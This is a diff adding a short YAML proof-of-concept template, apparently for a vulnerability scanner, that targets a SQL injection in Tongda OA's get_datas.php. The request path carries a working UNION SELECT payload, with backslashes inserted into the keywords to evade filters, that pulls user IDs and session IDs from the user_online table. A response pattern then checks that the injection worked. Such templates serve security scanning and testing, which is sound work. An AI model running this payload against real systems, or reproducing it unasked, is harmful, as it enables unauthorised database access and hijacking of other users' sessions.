@@ -1,0 +1,17 @@
+name: poc-yaml-tongda-oa-sqli
+set:
+  r1: randomInt(800000000, 1000000000)
+rules:
+- method: GET
+  path: /general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5
+    whe\\re {{r1}}={`\='` {{r1}}} un\ion (s\elect uid,sid fr\om user_online whe\\re
+    {{r1}}\={`=` {{r1}}})-- '
+  body: ""
+  followredirects: false
+  expression: |
+    response.status == 200 && "1;1*".bmatches(response.body)
+    
+detail:
+  author: zystrix(https://github.com/xiaoyanyuha)
+  links:
+    - https://www.t00ls.cc/Vuls-T00ls-2021-00055.html
